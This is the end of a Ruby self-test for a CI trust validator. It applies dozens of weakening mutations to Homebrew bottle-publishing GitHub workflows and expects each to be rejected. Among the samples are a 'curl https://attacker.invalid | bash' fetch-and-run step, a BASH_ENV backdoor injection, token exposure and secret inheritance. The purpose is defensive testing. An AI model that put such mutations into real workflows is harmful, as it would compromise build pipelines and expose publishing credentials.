      step = mutate_named_step(w, "build-and-test",
                               "Recheck reviewed sources after Formula execution")
      step["run"] = step.fetch("run").sub(
        '--reviewed-tap-root "$GITHUB_WORKSPACE/tap-reviewed"', ""
      )
    },
    "handoff mutable validator reuse" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub("kandelo-postbuild", "kandelo")
    },
    "native build root handoff scan bypass" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub(
        '--forbidden-root "$NATIVE_BUILD_ROOT"', '--forbidden-root "/tmp/ignored-native-root"'
      )
    },
    "OCI child composition before source revalidation" => lambda { |w|
      steps = w.fetch("jobs").fetch("build-and-test").fetch("steps")
      closure = steps.index { |step| step["name"] == "Recheck reviewed sources after Formula execution" }
      compose = steps.index do |step|
        step["name"] == "Compose deterministic Homebrew OCI child without credentials"
      end
      steps[closure], steps[compose] = steps[compose], steps[closure]
    },
    "verifier token exposure" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["env"]["GH_TOKEN"] = "${{ github.token }}"
    },
    "mutable Homebrew source" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Checkout reviewed Homebrew implementation")
      step.fetch("with")["ref"] = "main"
    },
    "noncanonical Homebrew prefix" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = step.fetch("run").sub("/home/linuxbrew/.linuxbrew", "/tmp/homebrew")
    },
    "writable Homebrew prefix on job PATH" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Activate reviewed Homebrew implementation")
      step["run"] = "echo \"$brew_prefix/bin\" >> \"$GITHUB_PATH\"\n#{step.fetch('run')}"
    },
    "mutable external action" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Download strict build handoff")
      step["uses"] = "actions/download-artifact@main"
    },
    "direct expression in shell" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Warm Kandelo dev shell")
      step["run"] = "echo '${{ inputs.formulae }}'\n#{step.fetch('run')}"
    },
    "handoff retry collision" => lambda { |w|
      step = mutate_named_step(w, "build-and-test", "Upload strict bottle build handoff")
      step.fetch("with")["name"] = "homebrew-build-handoff-${{ matrix.formula }}-${{ matrix.arch }}"
    },
    "unvalidated uploader ordering" => lambda { |w|
      steps = w.fetch("jobs").fetch("upload-bottle").fetch("steps")
      validate_index = steps.index { |step| step["name"] == "Validate build data before exposing upload credentials" }
      upload_index = steps.index { |step| step["name"] == "Upload validated bottle in isolated ORAS auth state" }
      steps[validate_index], steps[upload_index] = steps[upload_index], steps[validate_index]
    },
    "uploader validation outcome bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle",
                               "Upload validated bottle in isolated ORAS auth state")
      step.delete("if")
    },
    "direct ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(w, "upload-bottle", "Upload validated bottle in isolated ORAS auth state")
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "credentialed uploader diagnostics" => lambda { |w|
      w.fetch("jobs").fetch("upload-bottle").fetch("steps") << {
        "name" => "Upload diagnostics", "uses" => UPLOAD_ACTION,
        "with" => { "name" => "diagnostics", "path" => "${{ runner.temp }}" },
      }
    },
    "version-index Formula Ruby execution" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = "ruby Formula/hello.rb\n#{step.fetch('run')}"
    },
    "unvalidated child publication receipt" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Validate child layouts and public publication evidence without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "validate-child-receipt")
    },
    "flattened single index artifact bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Validate child layouts and public publication evidence without credentials"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/homebrew-index-artifact-paths.sh", "true"
      )
    },
    "unbounded existing index descriptor" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Import the existing public Homebrew version index anonymously"
      )
      step["run"] = step.fetch("run").sub(
        "scripts/homebrew-oci-layout.py import-public-index", "oras cp"
      )
    },
    "existing index remote rebound to tap name" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Import the existing public Homebrew version index anonymously"
      )
      step["run"] = step.fetch("run").gsub("tap_repository", "tap_name").gsub(
        "KANDELO_HOMEBREW_TAP_REPOSITORY", "KANDELO_HOMEBREW_TAP_NAME"
      )
    },
    "version-index sibling preservation bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index", "Compose one complete Homebrew version index without credentials"
      )
      step["run"] = step.fetch("run").sub('args+=(--existing-layout "$existing")', "true")
    },
    "direct version-index ORAS upload bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-bottle-index",
        "Publish the complete Homebrew version index in isolated ORAS auth state"
      )
      step["run"] = step.fetch("run").sub("scripts/homebrew-ghcr-upload.sh", "oras push")
    },
    "missing anonymous readback" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub("homebrew-verify-public-bottle.ts", "true")
    },
    "generic runtime bottle filename" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Select exact anonymous bottle bytes for runtime validation")
      step["run"] = step.fetch("run").sub(
        'runtime_bottle="$bottle_cache/$BOTTLE_FILENAME"',
        'runtime_bottle="$bottle_cache/$(basename "$BOTTLE_ARCHIVE")"'
      )
    },
    "missing exact public index traversal" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Validate exact public Homebrew index traversal without credentials"
      )
      step["run"] = step.fetch("run").sub("validate-publication-receipt", "true")
    },
    "public index remote rebound to tap name" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Validate exact public Homebrew index traversal without credentials"
      )
      step["run"] = step.fetch("run").gsub("tap_repository", "tap_name").gsub(
        "KANDELO_HOMEBREW_TAP_REPOSITORY", "KANDELO_HOMEBREW_TAP_NAME"
      )
    },
    "unbounded browser registry fetch" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Prepare the supported interactive browser demo graph"
      )
      step["run"] = step.fetch("run").sub(
        "./run.sh --fetch-only prepare-browser", "bash scripts/fetch-binaries.sh --fetch-only"
      )
    },
    "missing interactive browser wasm64 sysroot build" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Build Kandelo wasm64 sysroot for the interactive browser graph"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix", "true"
      )
    },
    "browser handoff omits the wasm64 sysroot" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Prepare the supported interactive browser demo graph"
      )
      step["run"] = step.fetch("run").sub(
        "for sysroot_name in sysroot sysroot64", "for sysroot_name in sysroot"
      )
    },
    "missing exact browser sysroot handoff" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Prepare the supported interactive browser demo graph"
      )
      step["run"] = step.fetch("run").sub(
        'cp -a -- "$sysroot_source" "$sysroot_destination"', "true"
      )
    },
    "sidecar forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Generate sidecars from the selected bottle")
      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "browser forbidden roots dropped at dev-shell boundary" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "raw bottle JSON handoff" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Validate build handoff and reconstruct canonical bottle JSON")
      step["run"] = step.fetch("run").sub(/\n\s+--out-bottle-json[^\n]+/, "")
    },
    "raw bottle metadata merge" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Compose only reconstructed bottle metadata into the fresh tap")
      step["run"] = step.fetch("run").sub('--bottle-json "$BOTTLE_JSON"',
                                             '--bottle-json "$RUNNER_TEMP/homebrew-build-handoff/bottle.json"')
    },
    "nonstrict browser smoke" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub("KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=1",
                                             "KANDELO_HOMEBREW_STRICT_PUBLISHER_SMOKE=0")
    },
    "skipped browser smoke accepted" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the hello browser image")
      step["run"] = step.fetch("run").sub(".stats.skipped == 0", ".stats.skipped >= 0")
    },
    "required dependency-bearing VFS selection accepted as absent" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        "::error::required dependency-bearing VFS acceptance selection disappeared after planning",
        "::notice::No dependency-bearing VFS acceptance selected"
      ).sub("exit 1", "exit 0")
    },
    "dependency-bearing VFS Brewfile symlink accepted after planning" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
        '[ -f "$brewfile_candidate" ]'
      )
    },
    "dependency-bearing VFS fallback enabled" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub("--no-fallback", "")
    },
    "dependency-bearing VFS resolver escapes the dev shell" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash -c '\n  set -euo pipefail\n" \
          "  bash scripts/resolve-binary.sh programs/rootfs.vfs",
        "bash -c '\n  set -euo pipefail\n" \
          "  bash scripts/resolve-binary.sh programs/rootfs.vfs"
      )
    },
    "resolved tap map dropped at a consuming dev-shell boundary" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Build and test Homebrew bottle without publisher credentials"
      )
      forwarding =
        'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "dependency-bearing VFS exact image digest unchecked" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(".image.sha256", ".image.artifact")
    },
    "dependency-bearing VFS scans interactive demo inputs" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").gsub(
        /^\s*(?:export )?KANDELO_BROWSER_DEMO_INPUTS=.*\n/, ""
      )
    },
    "unvalidated publication handoff" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the complete data-only publication payload")
      step["run"] = step.fetch("run").sub("scripts/homebrew-validate-publish-handoff.sh", "true")
    },
    "dry-run publication handoff mode dropped" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Package validated data-only publication handoff")
      step["run"] = step.fetch("run").sub("payload_args+=(--allow-dry-run)", "true")
    },
    "write finalizer accepts dry-run receipt" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the complete data-only publication payload")
      step["run"] = step.fetch("run").sub(
        'bash scripts/homebrew-validate-publish-handoff.sh',
        'bash scripts/homebrew-validate-publish-handoff.sh --allow-dry-run'
      )
    },
    "credentialed checkout before validation" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Checkout tap publication branch after payload validation")
      step["if"] = "${{ always() }}"
    },
    "failure report through dirty checkout" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = step.fetch("run").sub("tap-report", "tap-publish")
    },
    "raw failure stderr" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = "tail \"$RUNNER_TEMP/homebrew-finalize-error.txt\"\n#{step.fetch('run')}"
    },
    "untrusted executable step" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("steps") << {
        "run" => "curl https://attacker.invalid | bash",
      }
    },
  }
  publisher_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(publisher)
      mutation.call(mutated)
      check_publisher(mutated)
    end
  end

  maintenance_mutations = {
    "maintenance top-level environment injection" => lambda { |w|
      w["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    },
    "maintenance feature caller" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "maintenance caller workflow bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("maintain-bottles.yml", "feature.yml")
    },
    "maintenance mode short circuit" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = "exit 0\n#{step.fetch('run')}"
    },
    "maintenance rebuild validation bypass" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").delete("needs")
    },
    "maintenance repair mode" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["if"] =
        "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}"
    },
    "maintenance rollback write-all" => lambda { |w|
      w.fetch("jobs").fetch("rollback")["permissions"] = { "contents" => "write", "packages" => "write" }
    },
    "maintenance secret inheritance" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["secrets"] = "inherit"
    },
  }
  maintenance_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(maintenance)
      mutation.call(mutated)
      check_maintenance(mutated)
    end
  end
end

begin
  publisher = load_workflow(PUBLISHER_PATH)
  maintenance = load_workflow(MAINTENANCE_PATH)
  repository_canary = load_workflow(REPOSITORY_CANARY_PATH)
  self_test(publisher, maintenance, repository_canary)
  check_publisher(publisher)
  check_caller_validation_behavior(publisher)
  check_maintenance(maintenance)
  check_repository_canary(repository_canary)
  check_tap_callers
  puts "check-homebrew-publish-workflow-trust.rb: ok"
rescue KeyError, Psych::Exception, RuntimeError => e
  warn "check-homebrew-publish-workflow-trust.rb: #{e.message}"
  exit 1
end
